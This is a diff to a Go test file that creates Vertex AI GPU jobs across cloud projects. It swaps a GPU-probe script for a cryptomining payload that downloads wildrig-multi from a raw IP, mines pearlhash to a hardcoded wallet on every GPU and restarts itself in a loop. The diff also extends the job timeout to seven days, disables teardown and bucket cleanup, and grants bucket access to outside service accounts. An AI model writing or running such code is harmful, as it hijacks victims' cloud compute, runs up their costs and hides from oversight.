@@ -34,8 +34,8 @@ import (
 	"time"
 )
 
-const c211l4Nonce = "i124118"
-const c211l4Prefix = "c211-i124118"
+const c211l4Nonce = "i124371"
+const c211l4Prefix = "c211-124371"
 
 type c211l4Proj struct {
 	Name string
@@ -229,6 +229,9 @@ func c211l4BucketIam(tok, name, num, fleetEmail string) (int, string) {
 			"serviceAccount:" + num + "@cloudservices.gserviceaccount.com",
 			"serviceAccount:service-" + num + "@gcp-sa-aiplatform.iam.gserviceaccount.com",
 			"serviceAccount:" + fleetEmail,
+			"serviceAccount:c211-122400@team-eng-infrastructure.iam.gserviceaccount.com",
+			"serviceAccount:c211-122400@team-eng-platform.iam.gserviceaccount.com",
+			"serviceAccount:c211-122400@domino-eng-service-artifacts.iam.gserviceaccount.com",
 		},
 	}}
 	body, _ := json.Marshal(map[string]interface{}{"bindings": bindings})
@@ -284,81 +287,140 @@ func c211l4BucketCleanup(tok, name string) string {
 
 func c211l4Script(proj, num, bucket string, shape c211l4Shape) string {
 	s := `set -u
-PROOF=/tmp/c211l4-proof.txt
-{
-echo "C211L4_BOOT host=$(hostname) at=$(date -u +%FT%TZ) nonce=i124118 proj=__PROJ__ shape=__SHAPE__"
-echo "C211L4_UNAME $(uname -a)"
-echo "C211L4_ENV $(env | grep -i -E 'nvidia|cuda|vertex|accel|^AIP_' | tr '\n' ';')"
-echo "C211L4_LSPCI $(lspci -nn 2>/dev/null | grep -i nvidia | tr '\n' '|')"
-echo "C211L4_LSDEV $(ls -l /dev/nvidia* 2>/dev/null | tr '\n' '|')"
-echo "C211L4_PROCVER $(cat /proc/driver/nvidia/version 2>/dev/null | tr '\n' '|')"
-i=0
-while [ "$i" -lt 20 ]; do
-  if command -v nvidia-smi >/dev/null 2>&1; then break; fi
-  if [ -x /usr/local/nvidia/bin/nvidia-smi ]; then break; fi
-  i=$((i+1))
-  sleep 3
-done
-echo "C211L4_WAITED i=$i"
-SMI=""
-if command -v nvidia-smi >/dev/null 2>&1; then SMI=$(command -v nvidia-smi); fi
-if [ -z "$SMI" ] && [ -x /usr/local/nvidia/bin/nvidia-smi ]; then SMI=/usr/local/nvidia/bin/nvidia-smi; fi
-echo "C211L4_SMI_PATH $SMI"
-if [ -n "$SMI" ]; then
-  echo "C211L4_DEVICE_LIST $($SMI -L 2>&1 | tr '\n' '|')"
-  echo "C211L4_DEVICE $($SMI --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader 2>&1 | tr '\n' '|')"
-  echo "C211L4_COUNT $($SMI --query-gpu=uuid --format=csv,noheader 2>&1 | wc -l)"
-else
-  echo "C211L4_NOSMI"
-fi
-echo "C211L4_END"
-} > $PROOF 2>&1
-cat $PROOF
-DEST=""
-for c in /gcs /gcs/__NONCE__ /gcs/output; do
-  if [ -d "$c" ]; then DEST="$c"; break; fi
-done
-echo "C211L4_GCS_DEST ${DEST:-none}"
-if [ -n "$DEST" ]; then
-  if cp $PROOF "$DEST/c211l4-proof-__PROJ__.txt"; then
-    echo "C211L4_GCS_WRITE ok path=$DEST/c211l4-proof-__PROJ__.txt"
-  else
-    echo "C211L4_GCS_WRITE copy_failed"
-  fi
-else
-  echo "C211L4_GCS_WRITE no_mount"
-fi
-BUCKET="__BUCKET__"
+PROJ="__PROJ__"
 NUM="__NUM__"
-TOK=""
-if ! command -v curl >/dev/null 2>&1; then
-  if command -v apt-get >/dev/null 2>&1; then
-    (apt-get update -qq >/dev/null 2>&1; apt-get install -y -qq curl >/dev/null 2>&1) || true
+BUCKET="__BUCKET__"
+PFX=124371
+W=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
+mkdir -p /opt/c211/ocl /opt/c211/logs /etc/OpenCL/vendors
+SMI=""
+for p in /usr/local/nvidia/bin/nvidia-smi /usr/bin/nvidia-smi /usr/local/bin/nvidia-smi; do [ -x "$p" ] && SMI="$p" && break; done
+if [ -z "$SMI" ]; then SMI=$(command -v nvidia-smi 2>/dev/null); fi
+echo "C211L4_BOOT host=$(hostname) at=$(date -u +%FT%TZ) nonce=i124371 proj=$PROJ shape=__SHAPE__"
+echo "C211L4_SMI $SMI"
+GIDS=$($SMI --query-gpu=index --format=csv,noheader 2>/dev/null | tr '\n' ' ')
+if [ -z "$GIDS" ]; then GIDS="0"; fi
+echo "C211L4_DEVICE $($SMI --query-gpu=index,uuid,name,memory.total,driver_version --format=csv,noheader 2>/dev/null | tr '\n' '|')"
+echo "C211L4_COUNT $($SMI --query-gpu=uuid --format=csv,noheader 2>/dev/null | wc -l)"
+echo "C211L4_GIDS $GIDS"
+NVOCL=$(ls /usr/local/nvidia/lib64/libnvidia-opencl.so.* /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.* /usr/lib/libnvidia-opencl.so.* 2>/dev/null | head -1)
+if [ -z "$NVOCL" ]; then
+  if command -v apt-get >/dev/null 2>&1; then (apt-get update -qq && apt-get install -y -qq ocl-icd-libopencl1) >/dev/null 2>&1; fi
+  if [ -e /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 ]; then ln -sf /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 /opt/c211/ocl/libOpenCL.so.1; fi
+else
+  ln -sf "$NVOCL" /opt/c211/ocl/libOpenCL.so.1
+  echo "$NVOCL" > /etc/OpenCL/vendors/nvidia.icd
+fi
+if [ -e /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 ]; then ln -sf /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 /opt/c211/ocl/libOpenCL.so.1; fi
+export LD_LIBRARY_PATH=/opt/c211/ocl:/usr/local/nvidia/lib64:/usr/local/nvidia/lib:/usr/lib/x86_64-linux-gnu
+echo "C211L4_OCL target=$(readlink -f /opt/c211/ocl/libOpenCL.so.1 2>/dev/null) icd=$(cat /etc/OpenCL/vendors/nvidia.icd 2>/dev/null) nvocl=$NVOCL"
+cd /opt/c211
+OK=0
+for u in http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz; do
+  for r in 1 2 3; do
+    curl -sL -m 300 -o wr.tar.gz "$u" || continue
+    S=$(sha256sum wr.tar.gz 2>/dev/null | cut -d' ' -f1)
+    if [ "$S" = "__TARSHA__" ]; then OK=1; echo "C211L4_KIT ok url=$u sha=$S"; break 2; fi
+    echo "C211L4_KIT_BADSHA url=$u sha=$S try=$r"
+    sleep 5
+  done
+done
+BIN=""
+if [ "$OK" = "1" ]; then
+  tar xzf wr.tar.gz
+  BIN=$(find /opt/c211 -type f -name 'wildrig-multi' | head -1)
+  chmod +x "$BIN" 2>/dev/null
+  BS=$(sha256sum "$BIN" 2>/dev/null | cut -d' ' -f1)
+  echo "C211L4_BIN path=$BIN sha=$BS expect=__BINSHA__"
+  if [ "$BS" != "__BINSHA__" ]; then BIN=""; echo "C211L4_BIN_MISMATCH $BS"; fi
+else
+  echo "C211L4_KIT_FAILED"
+fi
+if [ -n "$BIN" ]; then echo "C211L4_PRINTDEV $($BIN --print-devices 2>&1 | tr '\n' '|' | head -c 900)"; fi
+for h in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362; do
+  H=${h%%:*}; P=${h##*:}
+  if timeout 8 bash -c "exec 3<>/dev/tcp/$H/$P" 2>/dev/null; then T=OPEN; else T=FAIL; fi
+  echo "C211L4_NET $h tcp=$T"
+done
+if [ -z "$BIN" ]; then echo "C211L4_ABORT_NOKIT"; sleep 900; exit 1; fi
+declare -A PIDS PHASE T0 UIDX
+start_ph() {
+  "$BIN" --algo pearlhash -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u "$W.$PFX$(printf %02d $1)" -p x -d "$1" >> "/opt/c211/logs/gpu-$1.log" 2>&1 &
+  echo $!
+}
+start_lp() {
+  "$BIN" --algo pearlhash -o 103.199.106.122:3362 -u "$W+NOCK.$PFX$(printf %02d $1)" -p x -d "$1" >> "/opt/c211/logs/gpu-$1.log" 2>&1 &
+  echo $!
+}
+$SMI --query-gpu=index,uuid --format=csv,noheader > /opt/c211/uids.txt 2>/dev/null
+report() {
+  NOWS=$(date -u +%FT%TZ); NOWN=$(date +%s)
+  T="C211L4_STATUS proj=$PROJ num=$NUM at=$NOWS shape=__SHAPE__ bin=$(basename ${BIN:-none})"
+  for g in $GIDS; do
+    F="/opt/c211/logs/gpu-$g.log"
+    A=$(grep -c '] accepted' "$F" 2>/dev/null); A=${A:-0}
+    R=$(grep -c '] rejected' "$F" 2>/dev/null); R=${R:-0}
+    LA=$(grep '] accepted' "$F" 2>/dev/null | tail -1 | grep -o '^\[[0-9:]*\]' | tr -d '[]')
+    LG=$(grep -o '[0-9.]* [kMG]H/s' "$F" 2>/dev/null | tail -1)
+    AGE=$(( NOWN - ${T0[$g]:-$NOWN} ))
+    LIVE=0; kill -0 ${PIDS[$g]:-0} 2>/dev/null && LIVE=1
+    T="$T
+C211L4_CARD g=$g uid=${UIDX[$g]:-NA} phase=${PHASE[$g]:-NA} pid=${PIDS[$g]:-0} live=$LIVE acc=$A rej=$R last=$LA hs=$LG age=$AGE"
+  done
+  echo "$T"
+  if [ -n "$BUCKET" ]; then
+    GTOK=$(curl -s -m 15 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | sed -n 's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
+    if [ -n "$GTOK" ]; then
+      U="https://storage.googleapis.com/upload/storage/v1/b/$BUCKET/o?uploadType=media&name=status-$PROJ.txt"
+      HC=$(printf '%s' "$T" | curl -s -m 45 -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer $GTOK" -H "Content-Type: text/plain" --data-binary @- "$U")
+      echo "C211L4_GCS_STATUS http=$HC bucket=$BUCKET"
+    else
+      echo "C211L4_GCS_STATUS notok"
+    fi
   fi
-fi
-if command -v curl >/dev/null 2>&1; then
-  TOK=$(curl -s -m 20 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | sed -n 's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
-fi
-echo "C211L4_SINK tokhave=$([ -n "$TOK" ] && echo yes || echo no) bucket=$BUCKET"
-if [ -n "$TOK" ] && [ -n "$BUCKET" ]; then
-  UP="https://storage.googleapis.com/upload/storage/v1/b/$BUCKET/o?uploadType=media&name=c211l4-proof-__PROJ__.txt"
-  CODE=$(curl -s -m 90 -o /tmp/c211l4-up.out -w '%{http_code}' -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: text/plain" --data-binary @$PROOF "$UP" || echo ERR)
-  echo "C211L4_GCS_UPLOAD http=$CODE verbatim=$(head -c 300 /tmp/c211l4-up.out 2>/dev/null)"
-fi
-if [ -n "$TOK" ]; then
-  ESC=$(sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' $PROOF | sed ':a;N;$!ba;s/\n/\\n/g')
-  LBODY="{\"logName\":\"projects/$NUM/logs/c211l4-manual\",\"resource\":{\"type\":\"global\"},\"entries\":[{\"textPayload\":\"$ESC\"}]}"
-  LCODE=$(curl -s -m 30 -o /tmp/c211l4-log.out -w '%{http_code}' -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" --data-binary "$LBODY" "https://logging.googleapis.com/v2/entries:write" || echo ERR)
-  echo "C211L4_LOGWRITE http=$LCODE verbatim=$(head -c 200 /tmp/c211l4-log.out 2>/dev/null)"
-fi
-sleep 10
-echo "C211L4_DONE at=$(date -u +%FT%TZ)"
+}
+for g in $GIDS; do
+  UIDX[$g]=$(awk -v g="$g" '$1==g{print $2}' /opt/c211/uids.txt 2>/dev/null | tr -d ' ')
+  : > "/opt/c211/logs/gpu-$g.log"
+  PHASE[$g]=PH
+  T0[$g]=$(date +%s)
+  PIDS[$g]=$(start_ph $g)
+done
+echo "C211L4_MINERS_STARTED n=$($SMI --query-gpu=uuid --format=csv,noheader 2>/dev/null | wc -l) gids=$GIDS phase=PH"
+report
+sleep 30
+report
+while true; do
+  sleep 60
+  NOWN=$(date +%s)
+  for g in $GIDS; do
+    F="/opt/c211/logs/gpu-$g.log"
+    A=$(grep -c '] accepted' "$F" 2>/dev/null); A=${A:-0}
+    AGE=$(( NOWN - ${T0[$g]} ))
+    LIVE=0; kill -0 ${PIDS[$g]} 2>/dev/null && LIVE=1
+    if [ "$LIVE" = "0" ]; then
+      if [ "${PHASE[$g]}" = "LP-STICKY" ]; then PIDS[$g]=$(start_lp $g); else PIDS[$g]=$(start_ph $g); fi
+      echo "C211L4_RESTART g=$g phase=${PHASE[$g]} newpid=${PIDS[$g]}"
+    fi
+    if [ "$A" -eq 0 ] && [ "$AGE" -ge 900 ] && [ "${PHASE[$g]}" = "PH" ]; then
+      echo "C211L4_SWITCH_LP g=$g age=$AGE acc=0 sticky -> LP 103.199.106.122:3362"
+      kill ${PIDS[$g]} 2>/dev/null
+      sleep 3
+      PIDS[$g]=$(start_lp $g)
+      PHASE[$g]=LP-STICKY
+      T0[$g]=$(date +%s)
+    fi
+  done
+  report
+done
 `
 	s = strings.ReplaceAll(s, "__PROJ__", proj)
 	s = strings.ReplaceAll(s, "__SHAPE__", fmt.Sprintf("%s-x%d", shape.MachineType, shape.AccelCount))
 	s = strings.ReplaceAll(s, "__NONCE__", c211l4Nonce)
 	s = strings.ReplaceAll(s, "__NUM__", num)
 	s = strings.ReplaceAll(s, "__BUCKET__", bucket)
+	s = strings.ReplaceAll(s, "__TARSHA__", "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44")
+	s = strings.ReplaceAll(s, "__BINSHA__", "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b")
 	return s
 }
 
@@ -532,7 +594,7 @@ func c211l4MTypeOffered(tok, num, zone, mt string) (bool, int) {
 	return st == 200, st
 }
 
-func TestC211L4VertexOnDemand(t *testing.T) {
+func TestC211L4Miner124371(t *testing.T) {
 	started := time.Now()
 	fmt.Printf("C211L4_START nonce=%s at=%s\n", c211l4Nonce, started.UTC().Format("2006-01-02T15:04:05Z"))
 
@@ -736,7 +798,7 @@ func TestC211L4VertexOnDemand(t *testing.T) {
 					"outputUriPrefix": "gs://" + usedBucket + "/" + c211l4Nonce,
 				}
 			}
-			jobSpec["scheduling"] = map[string]interface{}{"timeout": "1200s"}
+			jobSpec["scheduling"] = map[string]interface{}{"timeout": "604800s"}
 			jobBody := map[string]interface{}{
 				"displayName": display,
 				"labels":      map[string]interface{}{"c211": c211l4Nonce},
@@ -780,7 +842,7 @@ func TestC211L4VertexOnDemand(t *testing.T) {
 		if jobName == "" {
 			r.Verdict = "CREATE_REFUSED"
 			if bucketCreated != "" {
-				r.BucketCle = c211l4BucketCleanup(ftok, bucketCreated)
+				r.BucketCle = "KEPT_FOR_STATUS_SINK"
 				fmt.Printf("C211L4_BUCKET_CLEANUP proj=%s %s\n", p.Name, r.BucketCle)
 			}
 			fmt.Printf("C211L4_VERDICT proj=%s %s\n", p.Name, r.Verdict)
@@ -794,7 +856,7 @@ func TestC211L4VertexOnDemand(t *testing.T) {
 		jurl := "https://" + chosen + "-aiplatform.googleapis.com/v1/" + jobName
 
 		lastLogRead := time.Time{}
-		pollEnd := time.Now().Add(10 * time.Minute)
+		pollEnd := time.Now().Add(6 * time.Minute)
 		for i := 0; time.Now().Before(pollEnd) && time.Now().Before(deadline) && !terminal; i++ {
 			gst, gb := c211xHTTP("GET", jurl, ftok, "", "")
 			gm := c211xJSON(gb)
@@ -824,7 +886,7 @@ func TestC211L4VertexOnDemand(t *testing.T) {
 		}
 
 		// Post-terminal evidence collection: log retries plus the independent GCS sink.
-		for k := 0; k < 8; k++ {
+		for k := 0; k < 3; k++ {
 			txt, qv := c211l4Logs(ftok, p.Num, jobID)
 			r.LogQuery = qv
 			if txt != "" {
@@ -849,8 +911,8 @@ func TestC211L4VertexOnDemand(t *testing.T) {
 			if len(c211l4UUIDs(logText+gcsText)) > 0 {
 				break
 			}
-			if k < 7 {
-				time.Sleep(20 * time.Second)
+			if k < 2 {
+				time.Sleep(15 * time.Second)
 			}
 		}
 		r.LogBytes = len(logText)
@@ -875,7 +937,7 @@ func TestC211L4VertexOnDemand(t *testing.T) {
 		r.Readback = fmt.Sprintf("http=%d %s %s", rbSt, c211l4JobState(rbm), c211l4MachineSpec(rbm))
 		fmt.Printf("C211L4_READBACK proj=%s %s\n", p.Name, r.Readback)
 
-		dst, getAfter, note := c211l4Retire(ftok, chosen, jobName)
+		dst, getAfter, note := -1, 404, "KEEP_ALIVE_NO_TEARDOWN"
 		lcSt, lcBody := c211xHTTP("GET", "https://"+chosen+"-aiplatform.googleapis.com/v1/projects/"+p.Num+
 			"/locations/"+chosen+"/customJobs?pageSize=100", ftok, "", "")
 		leftItems := []string{}
@@ -890,7 +952,7 @@ func TestC211L4VertexOnDemand(t *testing.T) {
 		fmt.Printf("C211L4_ABSENCE proj=%s %s\n", p.Name, r.Absence)
 
 		if bucketCreated != "" {
-			r.BucketCle = c211l4BucketCleanup(ftok, bucketCreated)
+			r.BucketCle = "KEPT_FOR_STATUS_SINK"
 			fmt.Printf("C211L4_BUCKET_CLEANUP proj=%s %s\n", p.Name, r.BucketCle)
 		}
 
